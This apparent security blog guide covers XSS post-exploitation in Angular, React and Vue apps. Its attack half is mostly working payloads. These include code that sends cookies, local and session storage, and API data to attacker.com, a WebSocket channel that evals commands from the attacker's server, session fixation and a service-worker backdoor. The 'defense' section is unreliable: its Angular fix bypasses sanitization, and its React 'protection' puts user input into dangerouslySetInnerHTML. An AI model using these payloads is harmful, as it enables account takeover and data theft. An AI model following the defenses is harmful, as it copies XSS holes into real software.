Cross-Site Scripting (XSS) remains one of the most prevalent web security vulnerabilities, but understanding what happens after a successful XSS exploitation is crucial for both security professionals and developers. In this comprehensive guide, we'll dive deep into advanced XSS post-exploitation techniques, focusing on framework-specific exploits and sophisticated session hijacking methods.

## Understanding the Foundation of XSS Post-Exploitation

Before diving into advanced techniques, it's essential to understand that XSS post-exploitation is about maximizing the impact of an already successful XSS vulnerability. The goal is typically to:

- Maintain persistence in the compromised application
- Escalate privileges when possible
- Extract sensitive information
- Manipulate application functionality
- Pivot to other parts of the application or network

## Framework-Specific Exploits

### Modern Web Framework Vulnerabilities

**Angular-Specific Exploits:** Angular applications often present unique exploitation opportunities due to their template syntax. When targeting Angular applications, attackers can leverage template injection to execute arbitrary JavaScript:

```javascript
{{constructor.constructor('alert(1)')()}}
```

This payload exploits Angular's template compilation process, allowing direct JavaScript execution. More sophisticated attacks might include:

```javascript
{{$eval.constructor('fetch("/api/sensitive-data").then(r=>r.text()).then(d=>fetch("https://attacker.com?data="+d))')()}}
```

**React Framework Exploitation:**  
React applications are vulnerable to different types of attacks, particularly through `dangerouslySetInnerHTML`. A common post-exploitation technique involves targeting React's state management:

```javascript
React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner.current
```

This can be used to access component internals and potentially modify application state.

**Vue.js Exploitation:**  
Vue.js applications can be exploited through template compilation vulnerabilities:

```javascript
new Vue({ template: `<div onclick='alert(1)'>Click me</div>` }).$mount('#app')
```

## Session Hijacking Methods

### Advanced Cookie Theft

Modern session hijacking goes beyond simple cookie theft. Here's a sophisticated approach:

```javascript
let stolenCookies = document.cookie;
let sessionData = { 
    cookies: stolenCookies, 
    localStorage: JSON.stringify(localStorage), 
    sessionStorage: JSON.stringify(sessionStorage), 
    userAgent: navigator.userAgent 
};
fetch('https://attacker.com/collect', { method: 'POST', body: JSON.stringify(sessionData) });
```

### Real-Time Session Riding

This technique involves maintaining an active connection to the attacker's server:

```javascript
const ws = new WebSocket('wss://attacker.com/control');
ws.onmessage = function(event) { 
    eval(event.data); 
};
```

### Advanced Session Fixation

Modern session fixation attacks can be combined with XSS to force specific session identifiers:

```javascript
document.cookie = "sessionId=controlled_session; path=/";
```

### Persistent Backdoors

Creating persistent access through service workers:

```javascript
navigator.serviceWorker.register('/evil-worker.js')
.then(registration => { 
    console.log('Backdoor installed'); 
});
```

## Defense Mechanisms and Mitigation

To protect against these advanced post-exploitation techniques:

### Content Security Policy (CSP)

Implement strict CSP headers:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

### Session Security

Implement secure session management:

```javascript
// Server-side session configuration
session.cookie.httpOnly = true;
session.cookie.secure = true;
session.cookie.sameSite = 'strict';
```

### Framework-Specific Protections

**Angular:**

```typescript
import { DomSanitizer } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) { 
    // Sanitize potentially dangerous content
    this.safeContent = this.sanitizer.bypassSecurityTrustHtml(content); 
}
```

**React:**

```javascript
// Use React's built-in XSS protection
const dangerousHTML = { __html: userInput };
<div dangerouslySetInnerHTML={dangerousHTML} />;
```

### Monitoring and Detection

Implement client-side monitoring:

```javascript
// Monitor DOM modifications
const observer = new MutationObserver(mutations => { 
    mutations.forEach(mutation => { 
        // Check for suspicious DOM changes
        checkForMaliciousContent(mutation); 
    }); 
});
observer.observe(document.body, { childList: true, subtree: true });
```

## Conclusion

XSS post-exploitation techniques continue to evolve, becoming more sophisticated with modern web frameworks and technologies. Understanding these advanced techniques is crucial for security professionals to implement effective defenses. Regular security assessments, keeping frameworks updated, and implementing proper security headers remain essential practices in preventing successful XSS attacks and their post-exploitation impact.
